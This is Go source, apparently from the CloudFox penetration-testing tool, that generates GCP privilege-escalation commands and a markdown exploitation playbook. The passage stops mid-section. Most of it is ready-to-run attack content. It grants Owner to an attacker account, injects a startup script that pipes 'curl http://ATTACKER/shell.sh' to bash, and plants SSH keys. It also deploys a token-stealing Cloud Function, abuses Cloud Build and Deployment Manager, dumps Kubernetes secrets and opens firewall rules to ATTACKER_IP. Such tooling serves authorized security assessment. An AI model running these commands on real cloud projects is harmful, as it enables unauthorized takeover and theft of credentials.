func GeneratePrivescCommand(permission, projectID, scopeID string) string {
	switch permission {
	// Service Account Impersonation
	case "iam.serviceAccounts.getAccessToken":
		return fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccounts.signBlob":
		return fmt.Sprintf("gcloud iam service-accounts sign-blob input.txt output.sig --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccounts.signJwt":
		return fmt.Sprintf("gcloud iam service-accounts sign-jwt jwt.json signed.jwt --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccounts.implicitDelegation":
		return fmt.Sprintf("# Chain through intermediary SA: gcloud auth print-access-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccounts.getOpenIdToken":
		return fmt.Sprintf("gcloud auth print-identity-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com --audiences=https://TARGET", projectID)

	// Key Creation
	case "iam.serviceAccountKeys.create":
		return fmt.Sprintf("gcloud iam service-accounts keys create key.json --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccountKeys.delete":
		return fmt.Sprintf("gcloud iam service-accounts keys delete KEY_ID --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "storage.hmacKeys.create":
		return fmt.Sprintf("gcloud storage hmac create TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "apikeys.keys.create":
		return fmt.Sprintf("gcloud alpha services api-keys create --project=%s", projectID)

	// IAM Policy Modification
	case "resourcemanager.projects.setIamPolicy":
		return fmt.Sprintf("gcloud projects add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/owner", projectID)
	case "resourcemanager.folders.setIamPolicy":
		return fmt.Sprintf("gcloud resource-manager folders add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/owner", scopeID)
	case "resourcemanager.organizations.setIamPolicy":
		return fmt.Sprintf("gcloud organizations add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/owner", scopeID)
	case "iam.serviceAccounts.setIamPolicy":
		return fmt.Sprintf("gcloud iam service-accounts add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/iam.serviceAccountTokenCreator", scopeID)
	case "iam.roles.update":
		return fmt.Sprintf("gcloud iam roles update ROLE_ID --project=%s --add-permissions=iam.serviceAccounts.getAccessToken", projectID)
	case "iam.roles.create":
		return fmt.Sprintf("gcloud iam roles create privesc_role --project=%s --permissions=iam.serviceAccounts.getAccessToken,iam.serviceAccountKeys.create", projectID)

	// Resource-level IAM
	case "storage.buckets.setIamPolicy":
		return fmt.Sprintf("gsutil iam ch user:ATTACKER@gmail.com:objectAdmin gs://%s", scopeID)
	case "pubsub.topics.setIamPolicy":
		return fmt.Sprintf("gcloud pubsub topics add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/pubsub.publisher --project=%s", scopeID, projectID)
	case "bigquery.datasets.setIamPolicy":
		return fmt.Sprintf("bq update --source=dataset_acl.json %s:%s", projectID, scopeID)
	case "secretmanager.secrets.setIamPolicy":
		return fmt.Sprintf("gcloud secrets add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/secretmanager.secretAccessor --project=%s", scopeID, projectID)
	case "kms.cryptoKeys.setIamPolicy":
		return fmt.Sprintf("gcloud kms keys add-iam-policy-binding KEY --keyring=KEYRING --location=LOCATION --member=user:ATTACKER@gmail.com --role=roles/cloudkms.cryptoKeyDecrypter --project=%s", projectID)

	// Compute
	case "compute.instances.create":
		return fmt.Sprintf("gcloud compute instances create pwn-vm --service-account=TARGET_SA@%s.iam.gserviceaccount.com --scopes=cloud-platform --zone=us-central1-a --project=%s", projectID, projectID)
	case "compute.instances.setServiceAccount":
		return fmt.Sprintf("gcloud compute instances set-service-account INSTANCE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --zone=ZONE --project=%s", projectID, projectID)
	case "compute.instances.setMetadata":
		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE --zone=ZONE --metadata=startup-script='curl http://ATTACKER/shell.sh|bash' --project=%s", projectID)
	case "compute.projects.setCommonInstanceMetadata":
		return fmt.Sprintf("gcloud compute project-info add-metadata --metadata=ssh-keys=\"attacker:$(cat ~/.ssh/id_rsa.pub)\" --project=%s", projectID)
	case "compute.instances.osLogin":
		return fmt.Sprintf("gcloud compute ssh INSTANCE --zone=ZONE --project=%s", projectID)
	case "compute.instances.osAdminLogin":
		return fmt.Sprintf("gcloud compute ssh INSTANCE --zone=ZONE --project=%s  # Then: sudo su", projectID)
	case "compute.instanceTemplates.create":
		return fmt.Sprintf("gcloud compute instance-templates create pwn-template --service-account=TARGET_SA@%s.iam.gserviceaccount.com --scopes=cloud-platform --project=%s", projectID, projectID)

	// Cloud Functions
	case "cloudfunctions.functions.create":
		return fmt.Sprintf("gcloud functions deploy pwn --runtime=python39 --trigger-http --service-account=TARGET_SA@%s.iam.gserviceaccount.com --entry-point=main --source=. --project=%s", projectID, projectID)
	case "cloudfunctions.functions.update":
		return fmt.Sprintf("gcloud functions deploy EXISTING_FUNC --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
	case "cloudfunctions.functions.sourceCodeSet":
		return fmt.Sprintf("gcloud functions deploy FUNC --source=gs://ATTACKER_BUCKET/malicious.zip --project=%s", projectID)
	case "cloudfunctions.functions.setIamPolicy":
		return fmt.Sprintf("gcloud functions add-iam-policy-binding FUNC --member=allUsers --role=roles/cloudfunctions.invoker --project=%s", projectID)

	// Cloud Run
	case "run.services.create":
		return fmt.Sprintf("gcloud run deploy pwn --image=ATTACKER_IMAGE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --allow-unauthenticated --region=us-central1 --project=%s", projectID, projectID)
	case "run.services.update":
		return fmt.Sprintf("gcloud run services update SERVICE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
	case "run.jobs.create":
		return fmt.Sprintf("gcloud run jobs create pwn-job --image=ATTACKER_IMAGE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
	case "run.jobs.run":
		return fmt.Sprintf("gcloud run jobs execute JOB_NAME --region=us-central1 --project=%s", projectID)

	// Data Processing
	case "dataproc.clusters.create":
		return fmt.Sprintf("gcloud dataproc clusters create pwn-cluster --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
	case "dataproc.jobs.create":
		return fmt.Sprintf("gcloud dataproc jobs submit pyspark gs://ATTACKER/pwn.py --cluster=CLUSTER --region=us-central1 --project=%s", projectID)
	case "dataflow.jobs.create":
		return fmt.Sprintf("gcloud dataflow jobs run pwn-job --gcs-location=gs://dataflow-templates/latest/... --service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)

	// AI/ML
	case "notebooks.instances.create":
		return fmt.Sprintf("gcloud notebooks instances create pwn-notebook --location=us-central1-a --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
	case "aiplatform.customJobs.create":
		return fmt.Sprintf("gcloud ai custom-jobs create --display-name=pwn-job --worker-pool-spec=... --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)

	// Orchestration
	case "composer.environments.create":
		return fmt.Sprintf("gcloud composer environments create pwn-env --location=us-central1 --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
	case "cloudscheduler.jobs.create":
		return fmt.Sprintf("gcloud scheduler jobs create http pwn-job --schedule='* * * * *' --uri=https://TARGET --oidc-service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
	case "cloudtasks.tasks.create":
		return fmt.Sprintf("gcloud tasks create-http-task --queue=QUEUE --url=https://TARGET --oidc-service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)

	// CI/CD
	case "cloudbuild.builds.create":
		return fmt.Sprintf("gcloud builds submit --config=cloudbuild.yaml --project=%s  # cloudbuild.yaml runs as Cloud Build SA", projectID)
	case "source.repos.update":
		return fmt.Sprintf("gcloud source repos clone REPO --project=%s  # Modify code for build injection", projectID)

	// Deployment Manager
	case "deploymentmanager.deployments.create":
		return fmt.Sprintf("gcloud deployment-manager deployments create pwn-deploy --config=config.yaml --project=%s  # config.yaml creates privileged resources", projectID)

	// GKE
	case "container.clusters.create":
		return fmt.Sprintf("gcloud container clusters create pwn-cluster --service-account=TARGET_SA@%s.iam.gserviceaccount.com --zone=us-central1-a --project=%s", projectID, projectID)
	case "container.clusters.getCredentials":
		return fmt.Sprintf("gcloud container clusters get-credentials CLUSTER --zone=ZONE --project=%s", projectID)
	case "container.pods.create":
		return fmt.Sprintf("kubectl run pwn --image=ATTACKER_IMAGE --serviceaccount=TARGET_SA")
	case "container.pods.exec":
		return "kubectl exec -it POD -- /bin/sh  # Then: cat /var/run/secrets/kubernetes.io/serviceaccount/token"
	case "container.secrets.get":
		return "kubectl get secret SECRET -o jsonpath='{.data}' | base64 -d"
	case "container.serviceAccounts.createToken":
		return "kubectl create token SERVICE_ACCOUNT --duration=999999h"

	// Secrets
	case "secretmanager.versions.access":
		return fmt.Sprintf("gcloud secrets versions access latest --secret=SECRET_NAME --project=%s", projectID)

	// Workload Identity Federation
	case "iam.workloadIdentityPools.create":
		return fmt.Sprintf("gcloud iam workload-identity-pools create pwn-pool --location=global --project=%s", projectID)
	case "iam.workloadIdentityPoolProviders.create":
		return fmt.Sprintf("gcloud iam workload-identity-pools providers create-oidc pwn-provider --location=global --workload-identity-pool=POOL --issuer-uri=https://ATTACKER --project=%s", projectID)

	// Org Policies
	case "orgpolicy.policy.set":
		return fmt.Sprintf("gcloud org-policies set-policy policy.yaml --project=%s  # Disable constraints like requireOsLogin", projectID)

	// SA Usage
	case "iam.serviceAccounts.actAs":
		return fmt.Sprintf("# Required alongside compute/serverless create permissions to attach SA")

	// Network Access
	case "iap.tunnelInstances.accessViaIAP":
		return fmt.Sprintf("gcloud compute start-iap-tunnel INSTANCE PORT --zone=ZONE --project=%s", projectID)
	case "compute.firewalls.create":
		return fmt.Sprintf("gcloud compute firewall-rules create allow-attacker --network=default --allow=tcp:22,tcp:3389 --source-ranges=ATTACKER_IP/32 --project=%s", projectID)

	default:
		return fmt.Sprintf("# %s - refer to GCP documentation for exploitation", permission)
	}
}

// GeneratePrivescPlaybook generates a comprehensive privilege escalation playbook from attack paths
func GeneratePrivescPlaybook(paths []AttackPath, identityHeader string) string {
	if len(paths) == 0 {
		return ""
	}

	var sections strings.Builder
	if identityHeader != "" {
		sections.WriteString(fmt.Sprintf(`# Privilege Escalation Playbook for %s
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified privilege escalation paths.

`, identityHeader))
	} else {
		sections.WriteString(`# GCP Privilege Escalation Playbook
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified privilege escalation paths.

`)
	}

	// Group paths by category
	categories := map[string][]AttackPath{
		"SA Impersonation":  {},
		"Key Creation":      {},
		"IAM Modification":  {},
		"Compute":           {},
		"Serverless":        {},
		"Data Processing":   {},
		"AI/ML":             {},
		"Orchestration":     {},
		"CI/CD":             {},
		"IaC":               {},
		"GKE":               {},
		"Secrets":           {},
		"Federation":        {},
		"Org Policy":        {},
		"Network Access":    {},
		"SA Usage":          {},
		"Billing":           {},
	}

	for _, path := range paths {
		if _, ok := categories[path.Category]; ok {
			categories[path.Category] = append(categories[path.Category], path)
		}
	}

	// Service Account Impersonation
	if len(categories["SA Impersonation"]) > 0 {
		sections.WriteString("## Service Account Impersonation\n\n")
		sections.WriteString("Principals with SA impersonation capabilities can generate tokens and act as service accounts.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["SA Impersonation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s at %s\n", path.Principal, path.PrincipalType, path.Method, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Generate access token for a service account (iam.serviceAccounts.getAccessToken)\n")
		sections.WriteString("gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Sign a blob as the SA (iam.serviceAccounts.signBlob)\n")
		sections.WriteString("echo 'data' | gcloud iam service-accounts sign-blob - signed.txt \\\n")
		sections.WriteString("    --iam-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Sign a JWT as the SA (iam.serviceAccounts.signJwt)\n")
		sections.WriteString("gcloud iam service-accounts sign-jwt input.json output.jwt \\\n")
		sections.WriteString("    --iam-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Generate OIDC token (iam.serviceAccounts.getOpenIdToken)\n")
		sections.WriteString("gcloud auth print-identity-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
	}

	// Key Creation
	if len(categories["Key Creation"]) > 0 {
		sections.WriteString("## Persistent Key Creation\n\n")
		sections.WriteString("Principals with key creation capabilities can create long-lived credentials.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Key Creation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create persistent SA key (iam.serviceAccountKeys.create)\n")
		sections.WriteString("gcloud iam service-accounts keys create key.json \\\n")
		sections.WriteString("    --iam-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Use the key\n")
		sections.WriteString("gcloud auth activate-service-account --key-file=key.json\n\n")
		sections.WriteString("# Create HMAC key for S3-compatible access (storage.hmacKeys.create)\n")
		sections.WriteString("gcloud storage hmac create TARGET_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
	}

	// IAM Modification
	if len(categories["IAM Modification"]) > 0 {
		sections.WriteString("## IAM Policy Modification\n\n")
		sections.WriteString("Principals with IAM modification capabilities can grant themselves elevated access.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["IAM Modification"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s at %s\n", path.Principal, path.PrincipalType, path.Method, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Grant Owner role at project level\n")
		sections.WriteString("gcloud projects add-iam-policy-binding PROJECT_ID \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/owner'\n\n")
		sections.WriteString("# Grant SA impersonation on a privileged SA\n")
		sections.WriteString("gcloud iam service-accounts add-iam-policy-binding \\\n")
		sections.WriteString("    TARGET_SA@PROJECT.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/iam.serviceAccountTokenCreator'\n\n")
		sections.WriteString("# Create custom role with escalation permissions\n")
		sections.WriteString("gcloud iam roles create privesc --project=PROJECT_ID \\\n")
		sections.WriteString("    --permissions='iam.serviceAccounts.getAccessToken,iam.serviceAccountKeys.create'\n")
		sections.WriteString("```\n\n")
	}

	// Compute
	if len(categories["Compute"]) > 0 {
		sections.WriteString("## Compute Instance Exploitation\n\n")
		sections.WriteString("Principals with compute permissions can create instances or modify metadata to escalate privileges.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Compute"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create instance with privileged SA (compute.instances.create + iam.serviceAccounts.actAs)\n")
		sections.WriteString("gcloud compute instances create pwned \\\n")
		sections.WriteString("    --zone=us-central1-a \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --scopes=cloud-platform\n\n")
		sections.WriteString("# SSH and steal token\n")
		sections.WriteString("gcloud compute ssh pwned --zone=us-central1-a \\\n")
		sections.WriteString("    --command='curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'\n\n")
		sections.WriteString("# Inject startup script for reverse shell (compute.instances.setMetadata)\n")
		sections.WriteString("gcloud compute instances add-metadata INSTANCE --zone=ZONE \\\n")
		sections.WriteString("    --metadata=startup-script='#!/bin/bash\n")
		sections.WriteString("curl http://ATTACKER/shell.sh | bash'\n\n")
		sections.WriteString("# Add SSH key via metadata\n")
		sections.WriteString("gcloud compute instances add-metadata INSTANCE --zone=ZONE \\\n")
		sections.WriteString("    --metadata=ssh-keys=\"attacker:$(cat ~/.ssh/id_rsa.pub)\"\n\n")
		sections.WriteString("# Project-wide SSH key injection (compute.projects.setCommonInstanceMetadata)\n")
		sections.WriteString("gcloud compute project-info add-metadata \\\n")
		sections.WriteString("    --metadata=ssh-keys=\"attacker:$(cat ~/.ssh/id_rsa.pub)\"\n")
		sections.WriteString("```\n\n")
	}

	// Serverless
	if len(categories["Serverless"]) > 0 {
		sections.WriteString("## Serverless Function/Service Exploitation\n\n")
		sections.WriteString("Principals with serverless permissions can deploy code that runs as privileged service accounts.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Serverless"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation - Cloud Functions:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create function that steals SA token\n")
		sections.WriteString("mkdir /tmp/pwn && cd /tmp/pwn\n")
		sections.WriteString("cat > main.py << 'EOF'\n")
		sections.WriteString("import functions_framework\n")
		sections.WriteString("import requests\n\n")
		sections.WriteString("@functions_framework.http\n")
		sections.WriteString("def pwn(request):\n")
		sections.WriteString("    r = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',\n")
		sections.WriteString("                     headers={'Metadata-Flavor': 'Google'})\n")
		sections.WriteString("    return r.json()\n")
		sections.WriteString("EOF\n")
		sections.WriteString("echo 'functions-framework\\nrequests' > requirements.txt\n\n")
		sections.WriteString("# Deploy with target SA\n")
		sections.WriteString("gcloud functions deploy token-stealer --gen2 --runtime=python311 \\\n")
		sections.WriteString("    --trigger-http --allow-unauthenticated \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
		sections.WriteString("### Exploitation - Cloud Run:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Deploy Cloud Run service with target SA\n")
		sections.WriteString("gcloud run deploy token-stealer --image=gcr.io/PROJECT/stealer \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --allow-unauthenticated\n")
		sections.WriteString("```\n\n")
	}

	// Data Processing
	if len(categories["Data Processing"]) > 0 {
		sections.WriteString("## Data Processing Service Exploitation\n\n")
		sections.WriteString("Principals with data processing permissions can submit jobs that run as privileged service accounts.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Data Processing"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation - Dataproc:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create Dataproc cluster with privileged SA\n")
		sections.WriteString("gcloud dataproc clusters create pwned \\\n")
		sections.WriteString("    --region=us-central1 \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Submit job to steal token\n")
		sections.WriteString("gcloud dataproc jobs submit pyspark token_stealer.py \\\n")
		sections.WriteString("    --cluster=pwned --region=us-central1\n")
		sections.WriteString("```\n\n")
		sections.WriteString("### Exploitation - Dataflow:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create Dataflow job with privileged SA\n")
		sections.WriteString("gcloud dataflow jobs run pwned \\\n")
		sections.WriteString("    --gcs-location=gs://dataflow-templates/latest/Word_Count \\\n")
		sections.WriteString("    --service-account-email=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
	}

	// AI/ML
	if len(categories["AI/ML"]) > 0 {
		sections.WriteString("## AI/ML Platform Exploitation\n\n")
		sections.WriteString("Principals with AI/ML permissions can create notebooks or training jobs that run as privileged SAs.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["AI/ML"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation - Vertex AI Workbench:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create notebook instance with privileged SA\n")
		sections.WriteString("gcloud notebooks instances create privesc-notebook \\\n")
		sections.WriteString("    --location=us-central1-a \\\n")
		sections.WriteString("    --machine-type=n1-standard-4 \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Access the notebook via JupyterLab UI or proxy\n")
		sections.WriteString("gcloud notebooks instances describe privesc-notebook --location=us-central1-a\n")
		sections.WriteString("```\n\n")
		sections.WriteString("### Exploitation - Vertex AI Custom Jobs:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create custom training job with privileged SA\n")
		sections.WriteString("gcloud ai custom-jobs create \\\n")
		sections.WriteString("    --region=us-central1 \\\n")
		sections.WriteString("    --display-name=privesc-job \\\n")
		sections.WriteString("    --worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=gcr.io/PROJECT/token-stealer \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
	}

	// Orchestration
	if len(categories["Orchestration"]) > 0 {
		sections.WriteString("## Orchestration Service Exploitation\n\n")
		sections.WriteString("Principals with orchestration permissions can create environments that run as privileged SAs.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Orchestration"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation - Cloud Composer:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Composer environments run Airflow with a highly privileged SA\n")
		sections.WriteString("gcloud composer environments create pwned \\\n")
		sections.WriteString("    --location=us-central1 \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Upload malicious DAG to steal credentials\n")
		sections.WriteString("gcloud composer environments storage dags import \\\n")
		sections.WriteString("    --environment=pwned --location=us-central1 \\\n")
		sections.WriteString("    --source=malicious_dag.py\n")
		sections.WriteString("```\n\n")
		sections.WriteString("### Exploitation - Cloud Scheduler:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create scheduled job that runs with target SA (OIDC auth)\n")
		sections.WriteString("gcloud scheduler jobs create http privesc-job \\\n")
		sections.WriteString("    --schedule='* * * * *' \\\n")
		sections.WriteString("    --uri='https://ATTACKER_CONTROLLED_ENDPOINT/receive' \\\n")
		sections.WriteString("    --oidc-service-account-email=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --location=us-central1\n")
		sections.WriteString("```\n\n")
		sections.WriteString("### Exploitation - Cloud Tasks:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create task queue\n")
		sections.WriteString("gcloud tasks queues create privesc-queue --location=us-central1\n\n")
		sections.WriteString("# Create HTTP task with OIDC token\n")
		sections.WriteString("gcloud tasks create-http-task \\\n")
		sections.WriteString("    --queue=privesc-queue \\\n")
		sections.WriteString("    --url='https://ATTACKER_CONTROLLED_ENDPOINT/receive' \\\n")
		sections.WriteString("    --oidc-service-account-email=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --location=us-central1\n")
		sections.WriteString("```\n\n")
	}

	// CI/CD
	if len(categories["CI/CD"]) > 0 {
		sections.WriteString("## CI/CD Service Exploitation\n\n")
		sections.WriteString("Principals with CI/CD permissions can run builds with the Cloud Build service account.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["CI/CD"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create malicious cloudbuild.yaml\n")
		sections.WriteString("cat > cloudbuild.yaml << 'EOF'\n")
		sections.WriteString("steps:\n")
		sections.WriteString("- name: 'gcr.io/cloud-builders/gcloud'\n")
		sections.WriteString("  entrypoint: 'bash'\n")
		sections.WriteString("  args:\n")
		sections.WriteString("  - '-c'\n")
		sections.WriteString("  - |\n")
		sections.WriteString("    # Cloud Build SA has project Editor by default!\n")
		sections.WriteString("    gcloud projects add-iam-policy-binding $PROJECT_ID \\\n")
		sections.WriteString("      --member='user:attacker@example.com' \\\n")
		sections.WriteString("      --role='roles/owner'\n")
		sections.WriteString("EOF\n\n")
		sections.WriteString("# Submit build\n")
		sections.WriteString("gcloud builds submit --config=cloudbuild.yaml .\n")
		sections.WriteString("```\n\n")
	}

	// IaC (Infrastructure as Code)
	if len(categories["IaC"]) > 0 {
		sections.WriteString("## Infrastructure as Code Exploitation\n\n")
		sections.WriteString("Principals with IaC permissions can deploy infrastructure using the Deployment Manager service account.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["IaC"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation - Deployment Manager:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create deployment config that grants attacker Owner role\n")
		sections.WriteString("cat > privesc-config.yaml << 'EOF'\n")
		sections.WriteString("resources:\n")
		sections.WriteString("- name: privesc-binding\n")
		sections.WriteString("  type: gcp-types/cloudresourcemanager-v1:virtual.projects.iamMemberBinding\n")
		sections.WriteString("  properties:\n")
		sections.WriteString("    resource: PROJECT_ID\n")
		sections.WriteString("    role: roles/owner\n")
		sections.WriteString("    member: user:attacker@example.com\n")
		sections.WriteString("EOF\n\n")
		sections.WriteString("# Deploy - runs as [PROJECT_NUMBER]@cloudservices.gserviceaccount.com\n")
		sections.WriteString("gcloud deployment-manager deployments create privesc-deploy \\\n")
		sections.WriteString("    --config=privesc-config.yaml\n")
		sections.WriteString("```\n\n")
	}

	// GKE
	if len(categories["GKE"]) > 0 {
		sections.WriteString("## GKE Cluster Exploitation\n\n")
		sections.WriteString("Principals with GKE permissions can access clusters, exec into pods, or read secrets.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["GKE"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Get cluster credentials\n")
		sections.WriteString("gcloud container clusters get-credentials CLUSTER --zone=ZONE\n\n")
		sections.WriteString("# Exec into a pod\n")
		sections.WriteString("kubectl exec -it POD_NAME -- /bin/sh\n\n")
		sections.WriteString("# Read secrets\n")
		sections.WriteString("kubectl get secrets -A -o yaml\n\n")
		sections.WriteString("# Steal node SA token (if Workload Identity not enabled)\n")
		sections.WriteString("kubectl exec -it POD -- curl -s -H 'Metadata-Flavor: Google' \\\n")
		sections.WriteString("    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n")
		sections.WriteString("```\n\n")
	}

	// Secrets
	if len(categories["Secrets"]) > 0 {
		sections.WriteString("## Secret Access\n\n")
		sections.WriteString("Principals with secret access can retrieve sensitive credentials.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Secrets"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List all secrets\n")
		sections.WriteString("gcloud secrets list --project=PROJECT_ID\n\n")
		sections.WriteString("# Access secret value\n")
		sections.WriteString("gcloud secrets versions access latest --secret=SECRET_NAME --project=PROJECT_ID\n\n")
		sections.WriteString("# Grant yourself secret access if you have setIamPolicy\n")
		sections.WriteString("gcloud secrets add-iam-policy-binding SECRET_NAME \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/secretmanager.secretAccessor'\n")
		sections.WriteString("```\n\n")
	}

	// Federation (Workload Identity)
	if len(categories["Federation"]) > 0 {
		sections.WriteString("## Workload Identity Federation Exploitation\n\n")
		sections.WriteString("Principals with federation permissions can create identity pools that allow external identities to impersonate GCP service accounts.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Federation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create workload identity pool\n")
		sections.WriteString("gcloud iam workload-identity-pools create attacker-pool \\\n")
		sections.WriteString("    --location=global \\\n")
		sections.WriteString("    --display-name='Attacker Pool'\n\n")
